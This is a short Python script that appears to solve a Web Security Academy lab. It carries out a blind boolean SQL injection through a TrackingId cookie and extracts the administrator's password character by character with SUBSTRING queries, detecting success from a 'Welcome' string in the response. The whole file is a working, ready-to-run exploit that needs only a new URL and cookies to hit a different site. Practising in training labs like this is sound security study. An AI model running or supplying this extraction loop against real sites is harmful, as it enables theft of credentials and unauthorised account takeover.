import requests
import string
import sys

URL = "https://0a4100a00442367e801b081100a900f3.web-security-academy.net"
pswd_len = 20
TRACKING = "KiJ3RHgJATi7wKko"
cookie_session = "qVkkDF2McaiwjYINkCXrUvX929QcXCil"

charset = string.ascii_lowercase + string.digits
password = ""
for pos in range(1, pswd_len + 1):
    for chr in charset:
        injected_syntax = f"' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {pos}, 1) = '{chr}'-- -"
        injection = TRACKING + injected_syntax
        cookies = {"TrackingId": injection, "session": f"{cookie_session}"}

        r = requests.get(URL, cookies=cookies)
        if "Welcome" in r.text:
            password = password + chr
            print(f"pos: {pos}, {chr} -> {password}")
            break


print(f"PASSWORD: {password}")